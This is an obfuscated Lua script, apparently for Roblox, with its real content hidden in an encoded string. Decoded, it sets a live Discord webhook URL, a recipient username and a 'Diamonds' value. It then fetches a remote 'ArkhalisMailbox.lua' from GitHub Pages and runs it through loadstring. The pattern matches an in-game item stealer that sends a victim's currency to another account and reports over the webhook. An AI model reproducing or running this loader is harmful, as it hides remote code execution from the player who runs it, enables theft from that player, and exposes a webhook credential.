--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=v2(v0(v30,16));if v19 then local v77=v5(v68,v19);v19=nil;return v77;else return v68;end end end);local function v20(v31,v32,v33)if v33 then local v69=(v31/((5 -3)^(v32-1)))%((5 -3)^(((v33-(1 -0)) -(v32-((879 -(282 + 595)) -1))) + (620 -(555 + 64)))) ;return v69-(v69%(932 -(857 + 74))) ;else local v70=((2207 -(1523 + 114)) -(367 + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v70 + v70))>=v70) and (1 + 0)) or (0 + 0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (2 -0) );v18=v18 + (1067 -(68 + 997)) ;return (v36 * (1526 -(226 + 1044))) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (12 -9) );v18=v18 + (121 -((58 -26) + 85)) ;return (v40 * 16777216) + (v39 * (66493 -(892 + 65))) + (v38 * (610 -354)) + v37 ;end local function v24()local v41=0 -0 ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(352 -(87 + 263))) then v46=v20(v43,(773 -572) -(67 + 113) ,23 + 8 );v47=((v20(v43,78 -(488 -(416 + 26)) )==(1 + 0)) and  -(3 -2)) or (953 -((2560 -1758) + 150)) ;v41=7 -4 ;end if (v41==(0 -0)) then v42=v23();v43=v23();v41=1;end if (v41==(3 + 0)) then if (v46==(997 -(915 + 82))) then if (v45==0) then return v47 * (0 -0) ;else v46=1 + 0 ;v44=0 -(0 + 0) ;end elseif (v46==2047) then return ((v45==0) and (v47 * ((1 -0)/(1187 -(1069 + (556 -(145 + 293))))))) or (v47 * NaN) ;end return v8(v47,v46-(1453 -(44 + 386)) ) * (v44 + (v45/((4 -2)^(113 -(1547 -(998 + 488)))))) ;end if (v41==(1 + 0)) then v44=1;v45=(v20(v43,1 -0 ,20 + 0 ) * ((793 -(368 + 135 + 288))^(100 -68))) + v42 ;v41=(17 + 3) -(10 + 8) ;end end end local function v25(v48)local v49;if  not v48 then v48=v23();if (v48==(1138 -(116 + 1022))) then return "";end end v49=v3(v16,v18,(v18 + v48) -(4 -3) );v18=v18 + v48 ;local v50={};for v66=773 -(201 + 571) , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v51==0) then local v71=0;while true do if (0==v71) then v52=0 -0 ;v53=nil;v71=1252 -(721 + 530) ;end if (v71~=(1272 -(945 + 326))) then else v51=1;break;end end end if (v51~=3) then else v58=nil;while true do local v78=0 -0 ;local v79;while true do if (v78==0) then v79=0 + 0 ;while true do if (v79==(700 -(271 + 429))) then local v102=0 -0 ;while true do if (v102==(1 + 0)) then v79=1501 -(1408 + 92) ;break;end if ((1086 -(461 + 625))==v102) then if (1==v52) then local v148=1288 -(993 + 295) ;local v149;local v150;while true do if ((1 + 0)==v148) then while true do if (v149~=(1171 -(418 + 753))) then else v150=0;while true do if (0~=v150) then else local v158=0 + 0 ;while true do if (v158==1) then v150=1 + 0 ;break;end if ((0 -0)==v158) then v57=v23();v58={};v158=1;end end end if (v150==(1935 -(565 + 1368))) then v52=2;break;end if (v150==(1 + 0)) then for v163=1,v57 do local v164=0 + 0 ;local v165;local v166;local v167;while true do if (v164==(1661 -(1477 + 184))) then v165=0 + 0 ;v166=nil;v164=1 -0 ;end if (v164==(530 -(406 + 123))) then v167=nil;while true do if (v165==(856 -(564 + 292))) then local v169=1769 -(1749 + 20) ;while true do if (v169==(0 + 0)) then v166=v21();v167=nil;v169=2 -1 ;end if (v169==1) then v165=1;break;end end end if (v165~=(1323 -(1249 + 73))) then else if (v166==(305 -(244 + 60))) then v167=v21()~=(0 + 0) ;elseif (v166==(1147 -(466 + 679))) then v167=v24();elseif (v166~=3) then else v167=v25();end v58[v163]=v167;break;end end break;end end end v56[6 -3 ]=v21();v150=5 -3 ;end end break;end end break;end if (v148~=(1900 -(106 + 1794))) then else v149=0;v150=nil;v148=1 + 0 ;end end end if (v52~=(0 + 0)) then else local v151=1613 -(1565 + 48) ;local v152;local v153;while true do if (v151~=(1 + 0)) then else while true do if (v152==(0 + 0)) then v153=1138 -(782 + 356) ;while true do if (v153==(0 -0)) then v53={};v54={};v153=268 -(176 + 91) ;end if (v153==(5 -3)) then v52=1 -0 ;break;end if (v153==1) then local v160=114 -(4 + 110) ;while true do if (0~=v160) then else v55={};v56={v53,v54,nil,v55};v160=1;end if (v160~=(3 -2)) then else v153=105 -(17 + 86) ;break;end end end end break;end end break;end if (v151==(1018 -(697 + 321))) then v152=0 -0 ;v153=nil;v151=1;end end end v102=1;end end end if (v79==(1 -0)) then if (v52~=(4 -2)) then else local v127=0 + 0 ;local v128;local v129;while true do if (v127==(0 -0)) then v128=0 -0 ;v129=nil;v127=2 -1 ;end if (v127==1) then while true do if (v128==(1227 -(322 + 905))) then v129=611 -(602 + 9) ;while true do local v157=1189 -(449 + 740) ;while true do if (v157==0) then if (v129==(167 -(122 + 44))) then return v56;end if (v129~=(872 -(826 + 46))) then else local v161=0;local v162;while true do if (v161==(0 -0)) then v162=0;while true do if (v162==(0 -0)) then local v168=0 + 0 ;while true do if (v168~=(1 + 0)) then else v162=1 -0 ;break;end if (v168==(65 -(30 + 35))) then for v171=441 -(382 + 58) ,v23() do local v172=0 -0 ;local v173;local v174;local v175;while true do if (v172==(1 + 0)) then v175=nil;while true do if ((1 -0)==v173) then while true do if (v174~=0) then else v175=v21();if (v20(v175,2 -1 ,1)~=(1205 -(902 + 303))) then else local v179=0;local v180;local v181;local v182;local v183;local v184;while true do if (v179==(0 + 0)) then v180=0;v181=nil;v179=1258 -(1043 + 214) ;end if (v179==(7 -5)) then v184=nil;while true do if (v180==(1214 -(323 + 889))) then while true do if (v181~=(1 + 2)) then else if (v20(v183,1693 -(1121 + 569) ,3)==1) then v184[218 -(22 + 192) ]=v58[v184[4]];end v53[v171]=v184;break;end if (v181==2) then local v188=0 -0 ;while true do if (v188==(581 -(361 + 219))) then v181=323 -(53 + 267) ;break;end if (v188~=(0 + 0)) then else local v193=413 -(15 + 398) ;while true do if (v193==0) then if (v20(v183,983 -(18 + 964) ,1)==(3 -2)) then v184[2]=v58[v184[2]];end if (v20(v183,2 + 0 ,2)==(1 + 0)) then v184[3]=v58[v184[853 -(20 + 830) ]];end v193=3 -2 ;end if (v193~=(1 + 0)) then else v188=1 -0 ;break;end end end end end if (v181~=(0 + 0)) then else v182=v20(v175,128 -(116 + 10) ,3);v183=v20(v175,1 + 3 ,242 -(141 + 95) );v181=739 -(542 + 196) ;end if ((1 -0)==v181) then local v189=0 -0 ;local v190;while true do if (v189~=(0 + 0)) then else v190=0;while true do if (v190==(0 -0)) then local v194=0 + 0 ;while true do if (v194==1) then v190=1 + 0 ;break;end if (v194~=0) then else v184={v22(),v22(),nil,nil};if (v182==(0 + 0)) then local v199=0 -0 ;local v200;local v201;while true do if ((1552 -(1126 + 425))==v199) then while true do if (v200==(0 + 0)) then v201=0;while true do if (v201==(405 -(118 + 287))) then v184[2 + 1 ]=v22();v184[6 -2 ]=v22();break;end end break;end end break;end if (v199==(0 -0)) then v200=0;v201=nil;v199=1122 -(118 + 1003) ;end end elseif (v182==(2 -1)) then v184[380 -(142 + 235) ]=v23();elseif (v182==(9 -7)) then v184[3 + 0 ]=v23() -((1 + 1)^16) ;elseif (v182~=(980 -(553 + 424))) then else local v204=0 -0 ;local v205;local v206;while true do if (v204==(1 + 0)) then while true do if (v205==(0 + 0)) then v206=0;while true do if (v206~=0) then else v184[852 -(254 + 595) ]=v23() -(2^16) ;v184[3 + 1 ]=v22();break;end end break;end end break;end if (v204~=(126 -(55 + 71))) then else v205=0;v206=nil;v204=1;end end end v194=1;end end end if (v190==(1 -0)) then v181=2;break;end end break;end end end end break;end if ((1 + 0)==v180) then local v185=0 -0 ;while true do if (v185==(1 + 0)) then v180=1 + 1 ;break;end if (v185~=0) then else v183=nil;v184=nil;v185=1 -0 ;end end end if ((939 -(714 + 225))~=v180) then else local v186=0 -0 ;while true do if ((0 -0)==v186) then v181=0 -0 ;v182=nil;v186=1 + 0 ;end if (v186~=(4 -3)) then else v180=754 -(239 + 514) ;break;end end end end break;end if (v179==(1 + 0)) then v182=nil;v183=nil;v179=1331 -(797 + 532) ;end end end break;end end break;end if (v173==(806 -(118 + 688))) then local v178=0 + 0 ;while true do if (v178==0) then v174=0 + 0 ;v175=nil;v178=2 -1 ;end if (v178==(1887 -(927 + 959))) then v173=1203 -(373 + 829) ;break;end end end end break;end if (v172==(732 -(16 + 716))) then v173=0 -0 ;v174=nil;v172=732 -(476 + 255) ;end end end for v176=1,v23() do v54[v176-(1131 -(369 + 761)) ]=v28();end v168=1 + 0 ;end end end if ((1 -0)==v162) then v129=1;break;end end break;end end end break;end end end break;end end break;end end end break;end end break;end end end break;end if (v51==(287 -(175 + 110))) then local v72=0;while true do if (v72~=(1 -0)) then else v51=241 -(64 + 174) ;break;end if (v72~=0) then else v56=nil;v57=nil;v72=1797 -(503 + 1293) ;end end end if (v51==(1 + 0)) then local v73=0 -0 ;while true do if ((0 -0)==v73) then local v97=336 -(144 + 192) ;while true do if ((0 + 0)~=v97) then else v54=nil;v55=nil;v97=1;end if (v97~=(217 -(42 + 174))) then else v73=1 + 0 ;break;end end end if ((1 + 0)~=v73) then else v51=1 + 1 ;break;end end end end end local function v29(v59,v60,v61)local v62=0;local v63;local v64;local v65;while true do if (v62==0) then v63=v59[1];v64=v59[2];v62=1;end if (v62==1) then v65=v59[3];return function(...)local v80=v63;local v81=v64;local v82=v65;local v83=v27;local v84=1;local v85= -1;local v86={};local v87={...};local v88=v12("#",...) -1 ;local v89={};local v90={};for v94=0,v88 do if (v94>=v82) then v86[v94-v82 ]=v87[v94 + 1 ];else v90[v94]=v87[v94 + 1 ];end end local v91=(v88-v82) + 1 ;local v92;local v93;while true do v92=v80[v84];v93=v92[1];if (v93<=4) then if (v93<=1) then if (v93==0) then v84=v92[3];else v90[v92[2]]=v92[3];end elseif (v93<=2) then local v106=v92[2];v90[v106]=v90[v106](v13(v90,v106 + 1 ,v85));elseif (v93>3) then v90[v92[2]][v92[3]]=v92[4];else do return;end end elseif (v93<=7) then if (v93<=5) then local v108=0;local v109;local v110;while true do if (v108==0) then v109=v92[2];v110=v90[v92[3]];v108=1;end if (v108==1) then v90[v109 + 1 ]=v110;v90[v109]=v110[v92[4]];break;end end elseif (v93>6) then v90[v92[2]]=v61[v92[3]];else v90[v92[2]]();end elseif (v93<=8) then local v111;local v112,v113;local v114;local v115;v90[v92[2]][v92[3]]=v92[4];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v61[v92[3]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v61[v92[3]];v84=v84 + 1 ;v92=v80[v84];v115=v92[2];v114=v90[v92[3]];v90[v115 + 1 ]=v114;v90[v115]=v114[v92[4]];v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]=v92[3];v84=v84 + 1 ;v92=v80[v84];v115=v92[2];v112,v113=v83(v90[v115](v13(v90,v115 + 1 ,v92[3])));v85=(v113 + v115) -1 ;v111=0;for v130=v115,v85 do v111=v111 + 1 ;v90[v130]=v112[v111];end v84=v84 + 1 ;v92=v80[v84];v115=v92[2];v90[v115]=v90[v115](v13(v90,v115 + 1 ,v85));v84=v84 + 1 ;v92=v80[v84];v90[v92[2]]();v84=v84 + 1 ;v92=v80[v84];v84=v92[3];elseif (v93==9) then local v137=v92[2];local v138,v139=v83(v90[v137](v13(v90,v137 + 1 ,v92[3])));v85=(v139 + v137) -1 ;local v140=0;for v146=v137,v85 do local v147=0;while true do if (0==v147) then v140=v140 + 1 ;v90[v146]=v138[v140];break;end end end elseif (v90[v92[2]]==v92[4]) then v84=v84 + 1 ;else v84=v92[3];end v84=v84 + 1 ;end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O3130393437392O33342O3138343336392O352F746574386B772O3659516277635172664D596A624A414C6C2O775F3236534834735936395A374C65317556516756516238365378327A697246515745376361512D684446030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D6503093O00736176696B63656D6F03083O004469616D6F6E6473022O0040E59C30A242001E3O0012013O00013O00260A3O000D0001000200044O000D0001001207000100033O00300800010004000500122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O00010001000100044O001D000100260A3O00010001000100044O00010001001201000100013O00260A000100170001000100044O00170001001207000200033O0030040002000A000B001207000200033O0030040002000C000D001201000100023O00260A000100100001000200044O001000010012013O00023O00044O0001000100044O0010000100044O000100012O00033O00017O00",v9(),...);end
